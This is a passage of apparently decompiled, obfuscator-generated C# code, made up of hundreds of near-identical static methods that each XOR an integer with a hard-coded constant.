		return int_4 ^ 0x4B8AB6;
	}

	[Obsolete("Exclude")]
	public static int smethod_7536(int int_4)
	{
		return int_4 ^ 0x18A1221A;
	}

	[Obsolete("Exclude")]
	public static int smethod_7537(int int_4)
	{
		return int_4 ^ 0x3F0AEAF8;
	}

	[Obsolete("Exclude")]
	public static int smethod_7540(int int_4)
	{
		return int_4 ^ 0x7BFFDCB1;
	}

	[Obsolete("Exclude")]
	public static int smethod_7541(int int_4)
	{
		return int_4 ^ 0x1176C0D5;
	}

	[Obsolete("Exclude")]
	public static int smethod_7543(int int_4)
	{
		return int_4 ^ 0x5A81345F;
	}

	[Obsolete("Exclude")]
	public static int smethod_7544(int int_4)
	{
		return int_4 ^ 0xC26E310;
	}

	[Obsolete("Exclude")]
	public static int smethod_7545(int int_4)
	{
		return int_4 ^ 0x2C8913AF;
	}

	[Obsolete("Exclude")]
	public static int smethod_7546(int int_4)
	{
		return int_4 ^ 0x216F8C2F;
	}

	[Obsolete("Exclude")]
	public static int smethod_7547(int int_4)
	{
		return int_4 ^ 0x5BC460EC;
	}

	[Obsolete("Exclude")]
	public static int smethod_7549(int int_4)
	{
		return int_4 ^ 0x1BE93EBC;
	}

	[Obsolete("Exclude")]
	public static int smethod_7551(int int_4)
	{
		return int_4 ^ 0x48198A72;
	}

	[Obsolete("Exclude")]
	public static int smethod_7552(int int_4)
	{
		return int_4 ^ 0x5DE28272;
	}

	[Obsolete("Exclude")]
	public static int smethod_7553(int int_4)
	{
		return int_4 ^ 0x1F2E06A9;
	}

	[Obsolete("Exclude")]
	public static int smethod_7554(int int_4)
	{
		return int_4 ^ 0x211C8A52;
	}

	[Obsolete("Exclude")]
	public static int smethod_7555(int int_4)
	{
		return int_4 ^ 0x1356B59F;
	}

	[Obsolete("Exclude")]
	public static int smethod_7556(int int_4)
	{
		return int_4 ^ 0x4FAA2D4D;
	}

	[Obsolete("Exclude")]
	public static int smethod_7558(int int_4)
	{
		return int_4 ^ 0x7170B62A;
	}

	[Obsolete("Exclude")]
	public static int smethod_7560(int int_4)
	{
		return int_4 ^ 0x72210339;
	}

	[Obsolete("Exclude")]
	public static int smethod_7561(int int_4)
	{
		return int_4 ^ 0x520FF1B6;
	}

	[Obsolete("Exclude")]
	public static int smethod_7563(int int_4)
	{
		return int_4 ^ 0x624AF56C;
	}

	[Obsolete("Exclude")]
	public static int smethod_7564(int int_4)
	{
		return int_4 ^ 0x5D8FB4FD;
	}

	[Obsolete("Exclude")]
	public static int smethod_7565(int int_4)
	{
		return int_4 ^ 0x3C7AFE32;
	}

	[Obsolete("Exclude")]
	public static int smethod_7566(int int_4)
	{
		return int_4 ^ 0x442B1120;
	}

	[Obsolete("Exclude")]
	public static int smethod_7567(int int_4)
	{
		return int_4 ^ 0x4E34FD49;
	}

	[Obsolete("Exclude")]
	public static int smethod_7568(int int_4)
	{
		return int_4 ^ 0x32314429;
	}

	[Obsolete("Exclude")]
	public static int smethod_7569(int int_4)
	{
		return int_4 ^ 0x2CAFBA2E;
	}

	[Obsolete("Exclude")]
	public static int smethod_7570(int int_4)
	{
		return int_4 ^ 0x2AF4FC8A;
	}

	[Obsolete("Exclude")]
	public static int smethod_7571(int int_4)
	{
		return int_4 ^ 0x31957B3A;
	}

	[Obsolete("Exclude")]
	public static int smethod_7572(int int_4)
	{
		return int_4 ^ 0x1C6ED58B;
	}

	[Obsolete("Exclude")]
	public static int smethod_7573(int int_4)
	{
		return int_4 ^ 0x31AACF2D;
	}

	[Obsolete("Exclude")]
	public static int smethod_7574(int int_4)
	{
		return int_4 ^ 0x67B5BD60;
	}

	[Obsolete("Exclude")]
	public static int smethod_7575(int int_4)
	{
		return int_4 ^ 0x54FB1AFA;
	}

	[Obsolete("Exclude")]
	public static int smethod_7577(int int_4)
	{
		return int_4 ^ 0x14C387EF;
	}

	[Obsolete("Exclude")]
	public static int smethod_7580(int int_4)
	{
		return int_4 ^ 0x3A52BE62;
	}

	[Obsolete("Exclude")]
	public static int smethod_7582(int int_4)
	{
		return int_4 ^ 0x17BC57C4;
	}

	[Obsolete("Exclude")]
	public static int smethod_7585(int int_4)
	{
		return int_4 ^ 0x5D379181;
	}

	[Obsolete("Exclude")]
	public static int smethod_7587(int int_4)
	{
		return int_4 ^ 0x4291CBED;
	}

	[Obsolete("Exclude")]
	public static int smethod_7588(int int_4)
	{
		return int_4 ^ 0x407D59E7;
	}

	[Obsolete("Exclude")]
	public static int smethod_7589(int int_4)
	{
		return int_4 ^ 0x8C63FEF;
	}

	[Obsolete("Exclude")]
	public static int smethod_7590(int int_4)
	{
		return int_4 ^ 0x5D4C2174;
	}

	[Obsolete("Exclude")]
	public static int smethod_7591(int int_4)
	{
		return int_4 ^ 0x62382819;
	}

	[Obsolete("Exclude")]
	public static int smethod_7592(int int_4)
	{
		return int_4 ^ 0x2EE8DE00;
	}

	[Obsolete("Exclude")]
	public static int smethod_7593(int int_4)
	{
		return int_4 ^ 0x21773DC2;
	}

	[Obsolete("Exclude")]
	public static int smethod_7595(int int_4)
	{
		return int_4 ^ 0x41061F0F;
	}

	[Obsolete("Exclude")]
	public static int smethod_7596(int int_4)
	{
		return int_4 ^ 0x583AFF11;
	}

	[Obsolete("Exclude")]
	public static int smethod_7598(int int_4)
	{
		return int_4 ^ 0x139BAE91;
	}

	[Obsolete("Exclude")]
	public static int smethod_7600(int int_4)
	{
		return int_4 ^ 0x25162BD7;
	}

	[Obsolete("Exclude")]
	public static int smethod_7601(int int_4)
	{
		return int_4 ^ 0x4F87AA16;
	}

	[Obsolete("Exclude")]
	public static int smethod_7603(int int_4)
	{
		return int_4 ^ 0x40574CF3;
	}

	[Obsolete("Exclude")]
	public static int smethod_7604(int int_4)
	{
		return int_4 ^ 0x3229E693;
	}

	[Obsolete("Exclude")]
	public static int smethod_7605(int int_4)
	{
		return int_4 ^ 0x1DF32A58;
	}

	[Obsolete("Exclude")]
	public static int smethod_7606(int int_4)
	{
		return int_4 ^ 0x4F8C7C2E;
	}

	[Obsolete("Exclude")]
	public static int smethod_7608(int int_4)
	{
		return int_4 ^ 0x2659D359;
	}

	[Obsolete("Exclude")]
	public static int smethod_7610(int int_4)
	{
		return int_4 ^ 0x6FF5108D;
	}

	[Obsolete("Exclude")]
	public static int smethod_7611(int int_4)
	{
		return int_4 ^ 0x1C4373BE;
	}

	[Obsolete("Exclude")]
	public static int smethod_7612(int int_4)
	{
		return int_4 ^ 0x15310533;
	}

	[Obsolete("Exclude")]
	public static int smethod_7613(int int_4)
	{
		return int_4 ^ 0x2C4D11D7;
	}

	[Obsolete("Exclude")]
	public static int smethod_7614(int int_4)
	{
		return int_4 ^ 0x23A99201;
	}

	[Obsolete("Exclude")]
	public static int smethod_7616(int int_4)
	{
		return int_4 ^ 0x45880C56;
	}

	[Obsolete("Exclude")]
	public static int smethod_7618(int int_4)
	{
		return int_4 ^ 0x741CD094;
	}

	[Obsolete("Exclude")]
	public static int smethod_7619(int int_4)
	{
		return int_4 ^ 0x1E144217;
	}

	[Obsolete("Exclude")]
	public static int smethod_7620(int int_4)
	{
		return int_4 ^ 0x25E66D04;
	}

	[Obsolete("Exclude")]
	public static int smethod_7621(int int_4)
	{
		return int_4 ^ 0x20AD3FD0;
	}

	[Obsolete("Exclude")]
	public static int smethod_7622(int int_4)
	{
		return int_4 ^ 0x424DC0B;
	}

	[Obsolete("Exclude")]
	public static int smethod_7623(int int_4)
	{
		return int_4 ^ 0x2EFED678;
	}

	[Obsolete("Exclude")]
	public static int smethod_7625(int int_4)
	{
		return int_4 ^ 0x4DCB312A;
	}

	[Obsolete("Exclude")]
	public static int smethod_7626(int int_4)
	{
		return int_4 ^ 0x6A1000DE;
	}

	[Obsolete("Exclude")]
	public static int smethod_7627(int int_4)
	{
		return int_4 ^ 0x734415AF;
	}

	[Obsolete("Exclude")]
	public static int smethod_7628(int int_4)
	{
		return int_4 ^ 0x15E17E67;
	}

	[Obsolete("Exclude")]
	public static int smethod_7629(int int_4)
	{
		return int_4 ^ 0x6B262EBB;
	}

	[Obsolete("Exclude")]
	public static int smethod_7630(int int_4)
	{
		return int_4 ^ 0x2F44C198;
	}

	[Obsolete("Exclude")]
	public static int smethod_7631(int int_4)
	{
		return int_4 ^ 0x7AD85514;
	}

	[Obsolete("Exclude")]
	public static int smethod_7632(int int_4)
	{
		return int_4 ^ 0x26736361;
	}

	[Obsolete("Exclude")]
	public static int smethod_7633(int int_4)
	{
		return int_4 ^ 0x3C01E16F;
	}

	[Obsolete("Exclude")]
	public static int smethod_7636(int int_4)
	{
		return int_4 ^ 0x3E2DF889;
	}

	[Obsolete("Exclude")]
	public static int smethod_7637(int int_4)
	{
		return int_4 ^ 0x21916F95;
	}

	[Obsolete("Exclude")]
	public static int smethod_7638(int int_4)
	{
		return int_4 ^ 0x570B9875;
	}

	[Obsolete("Exclude")]
	public static int smethod_7639(int int_4)
	{
		return int_4 ^ 0x7A0D66C8;
	}

	[Obsolete("Exclude")]
	public static int smethod_7640(int int_4)
	{
		return int_4 ^ 0x7475943B;
	}

	[Obsolete("Exclude")]
	public static int smethod_7642(int int_4)
	{
		return int_4 ^ 0x331F500F;
	}

	[Obsolete("Exclude")]
	public static int smethod_7643(int int_4)
	{
		return int_4 ^ 0x1FC8E267;
	}

	[Obsolete("Exclude")]
	public static int smethod_7645(int int_4)
	{
		return int_4 ^ 0x5EC25B6;
	}

	[Obsolete("Exclude")]
	public static int smethod_7647(int int_4)
	{
		return int_4 ^ 0x22FCA486;
	}

	[Obsolete("Exclude")]
	public static int smethod_7648(int int_4)
	{
		return int_4 ^ 0x680BF902;
	}

	[Obsolete("Exclude")]
	public static int smethod_7649(int int_4)
	{
		return int_4 ^ 0x36A94579;
	}

	[Obsolete("Exclude")]
	public static int smethod_7651(int int_4)
	{
		return int_4 ^ 0x2347D74E;
	}

	[Obsolete("Exclude")]
	public static int smethod_7652(int int_4)
	{
		return int_4 ^ 0x35C1FECF;
	}

	[Obsolete("Exclude")]
	public static int smethod_7654(int int_4)
	{
		return int_4 ^ 0x2E439274;
	}

	[Obsolete("Exclude")]
	public static int smethod_7655(int int_4)
	{
		return int_4 ^ 0x65C964A5;
	}

	[Obsolete("Exclude")]
	public static int smethod_7656(int int_4)
	{
		return int_4 ^ 0x26B27069;
	}

	[Obsolete("Exclude")]
	public static int smethod_7658(int int_4)
	{
		return int_4 ^ 0x710ECE91;
	}

	[Obsolete("Exclude")]
	public static int smethod_7659(int int_4)
	{
		return int_4 ^ 0x7FA71C2B;
	}

	[Obsolete("Exclude")]
	public static int smethod_7660(int int_4)
	{
		return int_4 ^ 0x17A43410;
	}

	[Obsolete("Exclude")]
	public static int smethod_7662(int int_4)
	{
		return int_4 ^ 0x29E2829A;
	}

	[Obsolete("Exclude")]
	public static int smethod_7663(int int_4)
	{
		return int_4 ^ 0x3B8BB46F;
	}

	[Obsolete("Exclude")]
	public static int smethod_7664(int int_4)
	{
		return int_4 ^ 0x6068745F;
	}

	[Obsolete("Exclude")]
	public static int smethod_7666(int int_4)
	{
		return int_4 ^ 0x71C21E52;
	}

	[Obsolete("Exclude")]
	public static int smethod_7667(int int_4)
	{
		return int_4 ^ 0x32E8AABB;
	}

	[Obsolete("Exclude")]
	public static int smethod_7668(int int_4)
	{
		return int_4 ^ 0x284574B9;
	}

	[Obsolete("Exclude")]
	public static int smethod_7670(int int_4)
	{
		return int_4 ^ 0x5ABA85AC;
	}

	[Obsolete("Exclude")]
	public static int smethod_7671(int int_4)
	{
		return int_4 ^ 0x47F3E071;
	}

	[Obsolete("Exclude")]
	public static int smethod_7672(int int_4)
	{
		return int_4 ^ 0x7A7AA777;
	}

	[Obsolete("Exclude")]
	public static int smethod_7673(int int_4)
	{
		return int_4 ^ 0x52086CBD;
	}

	[Obsolete("Exclude")]
	public static int smethod_7674(int int_4)
	{
		return int_4 ^ 0x7201C9BA;
	}

	[Obsolete("Exclude")]
	public static int smethod_7675(int int_4)
	{
		return int_4 ^ 0x50CE649C;
	}

	[Obsolete("Exclude")]
	public static int smethod_7676(int int_4)
	{
		return int_4 ^ 0x83176B9;
	}

	[Obsolete("Exclude")]
	public static int smethod_7677(int int_4)
	{
		return int_4 ^ 0xDF91F75;
	}

	[Obsolete("Exclude")]
	public static int smethod_7679(int int_4)
	{
		return int_4 ^ 0xC7F0C29;
	}

	[Obsolete("Exclude")]
	public static int smethod_7683(int int_4)
	{
		return int_4 ^ 0x14618663;
	}

	[Obsolete("Exclude")]
	public static int smethod_7684(int int_4)
	{
		return int_4 ^ 0x69004753;
	}

	[Obsolete("Exclude")]
	public static int smethod_7687(int int_4)
	{
		return int_4 ^ 0x5F4AC0B5;
	}

	[Obsolete("Exclude")]
	public static int smethod_7688(int int_4)
	{
		return int_4 ^ 0x4121B72C;
	}

	[Obsolete("Exclude")]
	public static int smethod_7689(int int_4)
	{
		return int_4 ^ 0x6267AEB2;
	}

	[Obsolete("Exclude")]
	public static int smethod_7690(int int_4)
	{
		return int_4 ^ 0xDD3C81F;
	}

	[Obsolete("Exclude")]
	public static int smethod_7692(int int_4)
	{
		return int_4 ^ 0x1A6D26F0;
	}

	[Obsolete("Exclude")]
	public static int smethod_7693(int int_4)
	{
		return int_4 ^ 0x3C5E9546;
	}

	[Obsolete("Exclude")]
	public static int smethod_7694(int int_4)
	{
		return int_4 ^ 0x5AF35416;
	}

	[Obsolete("Exclude")]
	public static int smethod_7695(int int_4)
	{
		return int_4 ^ 0x3061C1B4;
	}

	[Obsolete("Exclude")]
	public static int smethod_7696(int int_4)
	{
		return int_4 ^ 0x84789DE;
	}

	[Obsolete("Exclude")]
	public static int smethod_7697(int int_4)
	{
		return int_4 ^ 0x48C7A050;
	}

	[Obsolete("Exclude")]
	public static int smethod_7698(int int_4)
	{
		return int_4 ^ 0x5FBA2BD0;
	}

	[Obsolete("Exclude")]
	public static int smethod_7699(int int_4)
	{
		return int_4 ^ 0x27DD5464;
	}

	[Obsolete("Exclude")]
	public static int smethod_7700(int int_4)
	{
		return int_4 ^ 0x2A5F9E7C;
	}

	[Obsolete("Exclude")]
	public static int smethod_7701(int int_4)
	{
		return int_4 ^ 0xA7C5F22;
	}

	[Obsolete("Exclude")]
	public static int smethod_7702(int int_4)
	{
		return int_4 ^ 0x7AF3152;
	}

	[Obsolete("Exclude")]
	public static int smethod_7703(int int_4)
	{
		return int_4 ^ 0x45772C62;
	}

	[Obsolete("Exclude")]
	public static int smethod_7704(int int_4)
	{
		return int_4 ^ 0x766AAA08;
	}

	[Obsolete("Exclude")]
	public static int smethod_7706(int int_4)
	{
		return int_4 ^ 0x5E744D17;
	}

	[Obsolete("Exclude")]
	public static int smethod_7707(int int_4)
	{
		return int_4 ^ 0x7377B33E;
	}

	[Obsolete("Exclude")]
	public static int smethod_7708(int int_4)
	{
		return int_4 ^ 0x7A787BDC;
	}

	[Obsolete("Exclude")]
	public static int smethod_7709(int int_4)
	{
		return int_4 ^ 0x5803438D;
	}

	[Obsolete("Exclude")]
	public static int smethod_7712(int int_4)
	{
		return int_4 ^ 0x760F148C;
	}

	[Obsolete("Exclude")]
	public static int smethod_7714(int int_4)
	{
		return int_4 ^ 0x693433D5;
	}

	[Obsolete("Exclude")]
	public static int smethod_7715(int int_4)
	{
		return int_4 ^ 0x36FDFE22;
	}

	[Obsolete("Exclude")]
	public static int smethod_7717(int int_4)
	{
		return int_4 ^ 0x42D6D75C;
	}

	[Obsolete("Exclude")]
	public static int smethod_7718(int int_4)
	{
		return int_4 ^ 0x72B62D6;
	}

	[Obsolete("Exclude")]
	public static int smethod_7719(int int_4)
	{
		return int_4 ^ 0x48040623;
	}

	[Obsolete("Exclude")]
	public static int smethod_7721(int int_4)
	{
		return int_4 ^ 0x13B9D454;
	}

	[Obsolete("Exclude")]
	public static int smethod_7722(int int_4)
	{
		return int_4 ^ 0x12CC7BAF;
	}

	[Obsolete("Exclude")]
	public static int smethod_7723(int int_4)
	{
		return int_4 ^ 0x1EC6D2C0;
	}

	[Obsolete("Exclude")]
	public static int smethod_7724(int int_4)
	{
		return int_4 ^ 0x24788B69;
	}

	[Obsolete("Exclude")]
	public static int smethod_7725(int int_4)
	{
		return int_4 ^ 0x356B707E;
	}

	[Obsolete("Exclude")]
	public static int smethod_7726(int int_4)
	{
		return int_4 ^ 0x7AC45AE9;
	}

	[Obsolete("Exclude")]
	public static int smethod_7727(int int_4)
	{
		return int_4 ^ 0x1F97CB31;
	}

	[Obsolete("Exclude")]
	public static int smethod_7730(int int_4)
	{
		return int_4 ^ 0x5EAF56C8;
	}

	[Obsolete("Exclude")]
	public static int smethod_7734(int int_4)
	{
		return int_4 ^ 0x366C25EC;
	}

	[Obsolete("Exclude")]
	public static int smethod_7735(int int_4)
	{
		return int_4 ^ 0x12E49D22;
	}

	[Obsolete("Exclude")]
	public static int smethod_7736(int int_4)
	{
		return int_4 ^ 0x72AF3CC0;
	}

	[Obsolete("Exclude")]
	public static int smethod_7737(int int_4)
	{
		return int_4 ^ 0x4260738F;
	}

	[Obsolete("Exclude")]
	public static int smethod_7738(int int_4)
	{
		return int_4 ^ 0x65F6FFA1;
	}

	[Obsolete("Exclude")]
	public static int smethod_7739(int int_4)
	{
		return int_4 ^ 0x420622F3;
	}

	[Obsolete("Exclude")]
	public static int smethod_7740(int int_4)
	{
		return int_4 ^ 0x53E706B;
	}

	[Obsolete("Exclude")]
	public static int smethod_7741(int int_4)
	{
		return int_4 ^ 0x12801C8F;
	}

	[Obsolete("Exclude")]
	public static int smethod_7743(int int_4)
	{
		return int_4 ^ 0x5E829A05;
	}

	[Obsolete("Exclude")]
	public static int smethod_7744(int int_4)
	{
		return int_4 ^ 0x70910EAB;
	}

	[Obsolete("Exclude")]
	public static int smethod_7745(int int_4)
	{
		return int_4 ^ 0x488F09DF;
	}

	[Obsolete("Exclude")]
	public static int smethod_7747(int int_4)
	{
		return int_4 ^ 0x6214EF82;
	}

	[Obsolete("Exclude")]
	public static int smethod_7748(int int_4)
	{
		return int_4 ^ 0x2F5DE655;
	}

	[Obsolete("Exclude")]
	public static int smethod_7749(int int_4)
	{
		return int_4 ^ 0x7059649F;
	}

	[Obsolete("Exclude")]
	public static int smethod_7751(int int_4)
	{
		return int_4 ^ 0x7DF7382E;
	}

	[Obsolete("Exclude")]
	public static int smethod_7752(int int_4)
	{
		return int_4 ^ 0x324FDB3A;
	}

	[Obsolete("Exclude")]
	public static int smethod_7754(int int_4)
	{
		return int_4 ^ 0x2F8479C;
	}

	[Obsolete("Exclude")]
	public static int smethod_7757(int int_4)
	{
		return int_4 ^ 0x302CF1AF;
	}

	[Obsolete("Exclude")]
	public static int smethod_7759(int int_4)
	{
		return int_4 ^ 0x137D304A;
	}

	[Obsolete("Exclude")]
	public static int smethod_7763(int int_4)
	{
		return int_4 ^ 0x74FDB8AC;
	}

	[Obsolete("Exclude")]
	public static int smethod_7764(int int_4)
	{
		return int_4 ^ 0x6BD9A889;
	}

	[Obsolete("Exclude")]
	public static int smethod_7765(int int_4)
	{
		return int_4 ^ 0x45EA9CAF;
	}

	[Obsolete("Exclude")]
	public static int smethod_7766(int int_4)
	{
		return int_4 ^ 0x23BB0720;
	}

	[Obsolete("Exclude")]
	public static int smethod_7767(int int_4)
	{
		return int_4 ^ 0xB3F2AFB;
	}

	[Obsolete("Exclude")]
	public static int smethod_7768(int int_4)
	{
		return int_4 ^ 0x4AF23E16;
	}

	[Obsolete("Exclude")]
	public static int smethod_7772(int int_4)
	{
		return int_4 ^ 0x5B7A9A79;
	}

	[Obsolete("Exclude")]
	public static int smethod_7773(int int_4)
	{
		return int_4 ^ 0x56BFCA73;
	}

	[Obsolete("Exclude")]
	public static int smethod_7774(int int_4)
	{
		return int_4 ^ 0x2F044405;
	}

	[Obsolete("Exclude")]
	public static int smethod_7775(int int_4)
	{
		return int_4 ^ 0x1E0F0AE1;
	}

	[Obsolete("Exclude")]
	public static int smethod_7776(int int_4)
	{
		return int_4 ^ 0x34C8189E;
	}

	[Obsolete("Exclude")]
	public static int smethod_7779(int int_4)
	{
		return int_4 ^ 0x71AF7B96;
	}

	[Obsolete("Exclude")]
	public static int smethod_7780(int int_4)
	{
		return int_4 ^ 0x728928A5;
	}

	[Obsolete("Exclude")]
	public static int smethod_7781(int int_4)
	{
		return int_4 ^ 0x2F4D72F4;
	}

	[Obsolete("Exclude")]
	public static int smethod_7783(int int_4)
	{
		return int_4 ^ 0x2AED74FD;
	}

	[Obsolete("Exclude")]
	public static int smethod_7786(int int_4)
	{
		return int_4 ^ 0x6E860014;
	}

	[Obsolete("Exclude")]
	public static int smethod_7787(int int_4)
	{
		return int_4 ^ 0x29B4E91A;
	}

	[Obsolete("Exclude")]
	public static int smethod_7788(int int_4)
	{
		return int_4 ^ 0x24DB1A88;
	}

	[Obsolete("Exclude")]
	public static int smethod_7789(int int_4)
	{
		return int_4 ^ 0x484462DF;
	}

	[Obsolete("Exclude")]
	public static int smethod_7791(int int_4)
	{
		return int_4 ^ 0x127A4419;
	}

	[Obsolete("Exclude")]
	public static int smethod_7794(int int_4)
	{
		return int_4 ^ 0x25429241;
	}

	[Obsolete("Exclude")]
	public static int smethod_7800(int int_4)
	{
		return int_4 ^ 0x7A9FEA2C;
	}

	[Obsolete("Exclude")]
	public static int smethod_7802(int int_4)
	{
		return int_4 ^ 0x542ACA3B;
	}

	[Obsolete("Exclude")]
	public static int smethod_7803(int int_4)
	{
		return int_4 ^ 0x2430B857;
	}

	[Obsolete("Exclude")]
	public static int smethod_7804(int int_4)
	{
		return int_4 ^ 0x1589DDF8;
	}

	[Obsolete("Exclude")]
	public static int smethod_7807(int int_4)
	{
		return int_4 ^ 0x3608B96F;
	}

	[Obsolete("Exclude")]
	public static int smethod_7808(int int_4)
	{
		return int_4 ^ 0x31363AF5;
	}

	[Obsolete("Exclude")]
	public static int smethod_7809(int int_4)
	{
		return int_4 ^ 0x6962867;
	}

	[Obsolete("Exclude")]
	public static int smethod_7810(int int_4)
	{
		return int_4 ^ 0x68872B91;
	}

	[Obsolete("Exclude")]
	public static int smethod_7811(int int_4)
	{
		return int_4 ^ 0x6D6291B9;
	}

	[Obsolete("Exclude")]
	public static int smethod_7813(int int_4)
	{
		return int_4 ^ 0x108A78A7;
	}

	[Obsolete("Exclude")]
	public static int smethod_7814(int int_4)
	{
		return int_4 ^ 0xA24AE41;
	}

	[Obsolete("Exclude")]
	public static int smethod_7815(int int_4)
	{
		return int_4 ^ 0x638FB200;
	}

	[Obsolete("Exclude")]
	public static int smethod_7818(int int_4)
	{
		return int_4 ^ 0x3A6F45A;
	}

	[Obsolete("Exclude")]
	public static int smethod_7820(int int_4)
	{
		return int_4 ^ 0x538F259B;
	}

	[Obsolete("Exclude")]
	public static int smethod_7821(int int_4)
	{
		return int_4 ^ 0x2DAD0AD4;
	}

	[Obsolete("Exclude")]
	public static int smethod_7823(int int_4)
	{
		return int_4 ^ 0x2464F5CB;
	}

	[Obsolete("Exclude")]
	public static int smethod_7824(int int_4)
	{
		return int_4 ^ 0x611B71F7;
	}

	[Obsolete("Exclude")]
	public static int smethod_7825(int int_4)
	{
		return int_4 ^ 0x49687BFA;
	}

	[Obsolete("Exclude")]
	public static int smethod_7826(int int_4)
	{
		return int_4 ^ 0x13D0F894;
	}

	[Obsolete("Exclude")]
	public static int smethod_7827(int int_4)
	{
		return int_4 ^ 0x2D1462DA;
	}

	[Obsolete("Exclude")]
	public static int smethod_7829(int int_4)
	{
		return int_4 ^ 0x32A13A63;
	}

	[Obsolete("Exclude")]
	public static int smethod_7830(int int_4)
	{
		return int_4 ^ 0x593CF97B;
	}

	[Obsolete("Exclude")]
	public static int smethod_7831(int int_4)
	{
		return int_4 ^ 0x2E6E882E;
	}

	[Obsolete("Exclude")]
	public static int smethod_7833(int int_4)
	{
		return int_4 ^ 0x748540F;
	}

	[Obsolete("Exclude")]
	public static int smethod_7835(int int_4)
	{
		return int_4 ^ 0x24F55E4C;
	}

	[Obsolete("Exclude")]
	public static int smethod_7837(int int_4)
	{
		return int_4 ^ 0x8C0AD15;
	}

	[Obsolete("Exclude")]
	public static int smethod_7838(int int_4)
	{
		return int_4 ^ 0x7C4BE1DF;
	}

	[Obsolete("Exclude")]
	public static int smethod_7839(int int_4)
	{
		return int_4 ^ 0x666F2CAC;
	}

	[Obsolete("Exclude")]
	public static int smethod_7842(int int_4)
	{
		return int_4 ^ 0xED0E080;
	}

	[Obsolete("Exclude")]
	public static int smethod_7843(int int_4)
	{
		return int_4 ^ 0x7B851571;
	}

	[Obsolete("Exclude")]
	public static int smethod_7844(int int_4)
	{
		return int_4 ^ 0x336FB93;
	}

	[Obsolete("Exclude")]
	public static int smethod_7846(int int_4)
	{
		return int_4 ^ 0xCE9512;
	}

	[Obsolete("Exclude")]
	public static int smethod_7847(int int_4)
	{
		return int_4 ^ 0xE8C67D2;
	}

	[Obsolete("Exclude")]
	public static int smethod_7849(int int_4)
	{
		return int_4 ^ 0x658C880A;
	}

	[Obsolete("Exclude")]
	public static int smethod_7850(int int_4)
	{
		return int_4 ^ 0x480A7B36;
	}

	[Obsolete("Exclude")]
	public static int smethod_7851(int int_4)
	{
		return int_4 ^ 0x3F1236FB;
	}

	[Obsolete("Exclude")]
	public static int smethod_7852(int int_4)
	{
		return int_4 ^ 0x2AAF7A2F;
	}

	[Obsolete("Exclude")]
	public static int smethod_7853(int int_4)
	{
		return int_4 ^ 0x5769E7F3;
	}

	[Obsolete("Exclude")]
	public static int smethod_7854(int int_4)
	{
		return int_4 ^ 0x30F1893;
	}

	[Obsolete("Exclude")]
	public static int smethod_7856(int int_4)
	{
		return int_4 ^ 0xBB787C4;
	}

	[Obsolete("Exclude")]
	public static int smethod_7857(int int_4)
	{
		return int_4 ^ 0x2B91C0DA;
	}

	[Obsolete("Exclude")]
	public static int smethod_7859(int int_4)
	{
		return int_4 ^ 0x2F7886A;
	}

	[Obsolete("Exclude")]
	public static int smethod_7861(int int_4)
	{
		return int_4 ^ 0x3E608EDD;
	}

	[Obsolete("Exclude")]
	public static int smethod_7863(int int_4)
	{
		return int_4 ^ 0xA3D4E4;
	}

	[Obsolete("Exclude")]
	public static int smethod_7864(int int_4)
	{
		return int_4 ^ 0x5AD475AD;
	}

	[Obsolete("Exclude")]
	public static int smethod_7865(int int_4)
	{
		return int_4 ^ 0x5B39D090;
	}

	[Obsolete("Exclude")]
	public static int smethod_7867(int int_4)
	{
		return int_4 ^ 0x10F30A26;
	}

	[Obsolete("Exclude")]
	public static int smethod_7868(int int_4)
	{
		return int_4 ^ 0x22FAE3B5;
	}

	[Obsolete("Exclude")]
	public static int smethod_7869(int int_4)
	{
		return int_4 ^ 0x158D871E;
	}

	[Obsolete("Exclude")]
	public static int smethod_7870(int int_4)
	{
		return int_4 ^ 0x28E8CA0E;
	}

	[Obsolete("Exclude")]
	public static int smethod_7872(int int_4)
	{
		return int_4 ^ 0x49949375;
	}

	[Obsolete("Exclude")]
	public static int smethod_7873(int int_4)
	{
		return int_4 ^ 0x54A9A8BF;
	}

	[Obsolete("Exclude")]
	public static int smethod_7874(int int_4)
	{
		return int_4 ^ 0x5BD54D6E;
	}

	[Obsolete("Exclude")]
	public static int smethod_7875(int int_4)
	{
		return int_4 ^ 0x5F6C648A;
	}

	[Obsolete("Exclude")]
	public static int smethod_7876(int int_4)
	{
		return int_4 ^ 0x7CBCB585;
	}

	[Obsolete("Exclude")]
	public static int smethod_7878(int int_4)
	{
		return int_4 ^ 0x73D1CC94;
	}

	[Obsolete("Exclude")]
	public static int smethod_7879(int int_4)
	{
		return int_4 ^ 0x348EC250;
	}

	[Obsolete("Exclude")]
	public static int smethod_7880(int int_4)
	{
		return int_4 ^ 0x7CC83F92;
	}

	[Obsolete("Exclude")]
	public static int smethod_7881(int int_4)
	{
		return int_4 ^ 0x451A83FC;
	}

	[Obsolete("Exclude")]
	public static int smethod_7883(int int_4)
	{
		return int_4 ^ 0xE5765B9;
	}

	[Obsolete("Exclude")]
	public static int smethod_7884(int int_4)
	{
		return int_4 ^ 0x726E660;
	}

	[Obsolete("Exclude")]
	public static int smethod_7885(int int_4)
	{
		return int_4 ^ 0x60D66DC5;
	}

	[Obsolete("Exclude")]
	public static int smethod_7888(int int_4)
	{
		return int_4 ^ 0x3EA44775;
	}

	[Obsolete("Exclude")]
	public static int smethod_7889(int int_4)
	{
		return int_4 ^ 0x7AA27EB2;
	}

	[Obsolete("Exclude")]
	public static int smethod_7890(int int_4)
	{
		return int_4 ^ 0x3A9CDB9B;
	}

	[Obsolete("Exclude")]
	public static int smethod_7891(int int_4)
	{
		return int_4 ^ 0xF052043;
	}

	[Obsolete("Exclude")]
	public static int smethod_7894(int int_4)
	{
		return int_4 ^ 0x5F0E12EC;
	}

	[Obsolete("Exclude")]
	public static int smethod_7895(int int_4)
	{
		return int_4 ^ 0x47DDD645;
	}

	[Obsolete("Exclude")]
	public static int smethod_7896(int int_4)
	{
		return int_4 ^ 0x47D6779A;
	}

	[Obsolete("Exclude")]
	public static int smethod_7897(int int_4)
	{
		return int_4 ^ 0x7D6F19BA;
	}

	[Obsolete("Exclude")]
	public static int smethod_7900(int int_4)
	{
		return int_4 ^ 0x6CACB01D;
	}

	[Obsolete("Exclude")]
	public static int smethod_7901(int int_4)
	{
		return int_4 ^ 0x5D09024F;
	}

	[Obsolete("Exclude")]
	public static int smethod_7904(int int_4)
	{
		return int_4 ^ 0x65D5A872;
	}

	[Obsolete("Exclude")]
	public static int smethod_7905(int int_4)
	{
		return int_4 ^ 0x10EDC946;
	}

	[Obsolete("Exclude")]
	public static int smethod_7906(int int_4)
	{
		return int_4 ^ 0x47EEC7B1;
	}

	[Obsolete("Exclude")]
	public static int smethod_7907(int int_4)
	{
